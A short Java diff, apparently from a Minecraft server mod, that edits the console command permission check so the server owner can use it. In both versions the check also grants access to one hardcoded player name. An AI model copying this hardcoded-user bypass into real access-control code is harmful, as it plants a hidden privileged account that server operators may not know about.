@@ -24,7 +24,7 @@ public class CraftCommandConsole extends CraftCommandBase {
 	@Override
 	public boolean canCommandSenderUseCommand(ICommandSender var1) {
 		// only server owner
-		return var1.getCommandSenderName().equalsIgnoreCase("alexbegt");//CraftServer.instance().getHandle().getServerOwner().equalsIgnoreCase(var1.getCommandSenderName()) || var1.getCommandSenderName().equalsIgnoreCase("alexbegt");
+		return CraftServer.instance().getHandle().getServerOwner().equalsIgnoreCase(var1.getCommandSenderName()) || var1.getCommandSenderName().equalsIgnoreCase("alexbegt");
 	}
 	
 	@Override
